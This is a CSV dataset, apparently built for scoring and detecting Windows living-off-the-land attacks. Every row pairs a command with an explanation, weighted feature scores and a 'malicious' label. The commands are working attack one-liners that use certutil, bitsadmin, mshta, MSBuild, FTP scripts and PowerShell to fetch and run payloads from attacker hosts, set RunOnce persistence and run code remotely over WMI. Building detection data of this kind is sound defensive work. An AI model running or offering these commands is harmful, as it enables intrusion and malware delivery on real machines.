prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label,,
"powershell (New-Object System.Net.WebClient).DownloadFile(""http://192.168.119.155/PowerUp.ps1""","This command downloads a PowerShell script from a remote server, which could be used to execute malicious code on the target machine.",powershell,System.Net.WebClient,none,http://192.168.119.155/PowerUp.ps1,192.168.119.155,"New-Object,DownloadFile",none,0.75,malicious,,
C:\Windows\System32\cmd.exe /c ping 127.0.0.1 && reg add HKEY CURRENT USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v enYXval36C /t REG SZ /d C:\enYXval36CenYXval36C\enYXval36C.vbs /f,"This command can be used to create a persistent backdoor by adding a registry key that executes a VBScript file every time the user logs in, while also disguising the command as a harmless ping to avoid detection.",cmd.exe,C:\enYXval36CenYXval36C\enYXval36C.vbs,none,C:\Windows\System32\cmd.exe,127.0.0.1,"/c,ping,add,/v,/t,/d,/f",none,0.75,malicious,,
C:\Windows\System32\cmd.exe /c (ping localhost >> nul & del $path\grey3.exe >> nul),"This command can be used to hide the execution of a malicious file (grey3.exe) by deleting it after pinging the local host, making it difficult to detect.",cmd.exe,grey3.exe,none,C:\Windows\System32\cmd.exe,localhost,"/c,ping,del",none,0.75,malicious,,
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://10.10.10.10/raw/iLxUT5gM,This command can be used to run a specific wizard on a Windows machine and the potential use in a cyberattack for 'living off the land' could be to execute a malicious wizard that could install malware or perform other malicious actions on the system.,xwizard,7940acf8-60ba-4213-a7c3-f3b400ee266d,none,https://10.10.10.10/raw/iLxUT5gM,10.10.10.10,RunWizard,none,0.76,malicious,,
Mshta https://median-researchers.000webhostapp.com/cmd.hta,Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript.,mshta,hta,none,https://median-researchers.000webhostapp.com,https://median-researchers.000webhostapp.com,cmd.hta,Mitre Attack,0.8,malicious,,
bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,"This command can be used to create a BITS job that downloads and executes a command shell from a remote server, allowing an attacker to execute arbitrary commands on the compromised machine.",bitsadmin,c:\\data\\playfolder\\1.txt:cmd.exe,bitsadmin,c:\\windows\\system32\\cmd.exe,none,"/create 1,/addfile 1,/RESUME 1,/complete 1",none,0.85,malicious,,
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,This command can be used to download and execute a malicious file from a remote server using the built-in Windows Background Intelligent Transfer Service (BITS).,bitsadmin,c:\\data\\playfolder\\autoruns.exe,bitsadmin,https://live.sysinternals.com/autoruns.exe ,none,"/create 1,/addfile 1,/RESUME 1,/complete 1",none,0.85,malicious,,
bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,"This command can be used to create a BITS job that downloads and executes a malicious file (cmd.exe) from a remote server, and then resets the BITS job to cover tracks.",bitsadmin,c:\\data\\playfolder\\cmd.exe,bitsadmin,c:\\windows\\system32\\cmd.exe,none,"/create 1,/addfile 1,/RESUME 1,/complete 1,/reset",none,0.85,malicious,,
bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset,"This command can be used to download and execute a malicious file (cmd.exe) from a remote server using the Background Intelligent Transfer Service (BITS) and set it to run automatically upon completion, while also hiding the execution from the user.",bitsadmin,c:\\data\\playfolder\\cmd.exe,bitsadmin,c:\\windows\\system32\\cmd.exe,none,"/create 1,/addfile 1,/SetNotifyCmdLine 1,/RESUME 1,/complete 1,/reset",none,0.85,malicious,,
"cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",This command can be used to download a payload from an attacker-controlled FTP server onto the victim's machine using the Windows command line.,cmd.exe,"attacker.com, USER attacker, PASS PaSsWoRd, binary, /payload.exe, quit",echo,ftp.txt,none,"/c,echo,GET,-s,-v",none,0.85,malicious,,
rasautou -d powershell.dll -p powershell -a a -e e,"This command can be used to execute PowerShell code from within a Remote Access Service (RAS) session, potentially allowing an attacker to bypass security measures and execute malicious code on a compromised machine.",rasautou,powershel.dll,powershell,powershell,none,"-d,-p,-a,-e",none,0.85,malicious,,
"sc create evilservice binPath=""\\""c:\\\\ADS\\\\file.txt:cmd.exe\\"" /c echo works > \\""c:\\ADS\\works.txt\\"""" DisplayName= ""evilservice"" start= auto\\ & sc start evilservice","This command creates a Windows service that executes a command to write ""works"" to a file in an Alternate Data Stream, allowing for stealthy persistence and execution of malicious code.",sc,c:\\ADS\\works.txt\\,evilservice,c:\\\\ADS\\\\file.txt:cmd.exe\\,none,"create,echo,start",none,0.85,malicious,,
"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""c:\\temp\\calc.bat""","This command can be used to execute a batch file containing malicious code on a target machine, potentially allowing an attacker to gain remote access or execute further commands.",msdeploy.exe,c:\\temp\\calc.bat,RunCommand,c:\\temp\\calc.bat,none,"-verb:sync,-source:RunCommand",none,0.85,malicious,,
"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""c:\\temp\\calc.bat""","This command can be used to execute a batch file containing malicious code on a target machine, potentially allowing an attacker to gain remote access or execute further commands.",msdeploy.exe,c:\\temp\\calc.bat,RunCommand,c:\\temp\\calc.bat,none,"-verb:sync,-source:RunCommand",none,0.85,malicious,,
"wmic /node:target.domain /user:domain\user /password:password process call create ""C:\Windows\Temp\Malice.exeâ€",This command can be used to remotely execute a malicious executable file on a target machine using valid credentials.,wmic,C:\Windows\Temp\Malice.exe,none,C:\Windows\Temp\Malice.exe,target.domain,create,none,0.85,malicious,,
"wmic /node:10.10.10.10 /user:domain\user /password:password process call create ""C:\Windows\Temp\Malice.exeâ€",This command can be used to remotely execute a malicious executable file on a target machine using Windows Management Instrumentation Command-line (WMIC) and can be used for lateral movement or to establish persistence on the target machine.,wmic,C:\Windows\Temp\Malice.exe,none,C:\Windows\Temp\Malice.exe,10.10.10.10,create,none,0.85,malicious,,
"powershell Invoke-WmiMethod win32_process -ComputerName dc.targetdomain.com -name create -argumentlist ""powershell.exe -e $encodedCommand""","This command can be used to remotely execute a PowerShell script encoded in Base64 on a target machine using WMI, allowing an attacker to execute arbitrary code on the target machine.",powershell,$encodedCommand,powershell,none,dc.targetdomain.com,"Invoke-WmiMethod,create,-argumentlist",none,0.85,malicious,,
"powershell Invoke-WmiMethod win32_process -ComputerName 10.10.10.10 -name create -argumentlist ""powershell.exe -e $encodedCommand""","This command can be used to remotely execute PowerShell code on a target machine using WMI, allowing an attacker to run malicious code without needing to drop any files on the target machine.",powershell,$encodedCommand,powershell,none,10.10.10.10,"Invoke-WmiMethod,create,-argumentlist",none,0.85,malicious,,
"cmd /V /c ""set MB=""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml""","This command can be used to execute a payload.xml file from a remote WebDAV server, potentially allowing an attacker to download and execute malicious code on the target Windows machine.",cmd,\\webdavserver\folder\payload.xml,payload.xml,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe,none,"/V,/c,set",none,0.85,malicious,,
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll,"This command can be used to download and execute a payload from a remote server, and then use InstallUtil to install and execute the payload as a Windows service.",certutil,payload.b64,payload.dll,http://webserver/payload.b64,none,"-urlcache,-split,-f",none,0.85,malicious,,
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe,"This command downloads a base64-encoded payload from a web server, decodes it, and executes it as an executable file, making it useful for delivering and executing malicious payloads in a cyberattack.",certutil,payload.b64,payload.exe,http://webserver/payload.b64,none,"-urlcache,-split,-f,-decode",none,0.85,malicious,,
"set ""SYSTEMROOT=C:\\Windows\\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr","This command sets the SYSTEMROOT environment variable to C:\\Windows\\Temp and then executes the desktopimgdownldr.exe program with parameters to download a file from a specified URL and set it as the lock screen image, potentially allowing an attacker to persistently display malicious content on the victim's machine.",desktopimgdownldr.exe,https://domain.com:8080/file.ext,desktopimgdownldr, https://domain.com:8080/file.ext,domain.com:8080,"set,/c,/eventName",none,0.95,malicious,,
"cmd.exe /c ""@echo open 11.11.11.11 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""","This command can be used to download a payload from an FTP server and execute it on the victim's machine, potentially allowing the attacker to gain remote access or control.",cmd.exe,"11.11.11.11, USER attacker, PASS PaSsWoRd, binary, /payload.exe, quit",echo,ftp.txt,11.11.11.11,"/c,echo,GET,-s,-v",none,0.95,malicious,,
"cmd.exe /c ""@echo open 10.10.10.10 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",This command can be used to download a payload from an FTP server and execute it on the victim's machine.,cmd.exe,"10.10.10.10, USER attacker, PASS PaSsWoRd, binary, /payload.exe, quit",echo,ftp.txt,10.10.10.10,"/c,echo,GET,-s,-v",none,0.95,malicious,,
"cmd /V /c ""set MB=""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"" & !MB! /noautoresponse /preprocess \\10.10.10.10\folder\payload.xml > payload.xml & !MB! payload.xml""","This command can be used to execute a payload.xml file from a remote server, potentially allowing an attacker to execute arbitrary code on the target machine.",cmd,\\10.10.10.10\folder\payload.xml,payload.xml,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe,10.10.10.10,"/V,/c,set",none,0.95,malicious,,
"cmd /V /c ""set MB=""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"" & !MB! /noautoresponse /preprocess \\11.11.11.11\folder\payload.xml > payload.xml & !MB! payload.xml""","This command can be used to execute a payload.xml file from a remote server, potentially allowing an attacker to execute malicious code on the target machine.",cmd, \\11.11.11.11\folder\payload.xml,payload.xml,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe,11.11.11.11,"/V,/c,set",none,0.95,malicious,,
certutil -urlcache -split -f http://10.10.10.10/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll,"This command downloads a base64-encoded payload from a remote server, decodes it, and installs it as a DLL using the .NET Framework's InstallUtil utility, potentially allowing an attacker to execute arbitrary code on the compromised machine.",certutil,payload.b64,payload.dll,http://10.10.10.10/payload.b64,10.10.10.10,"-urlcache,-split,-f",none,0.95,malicious,,
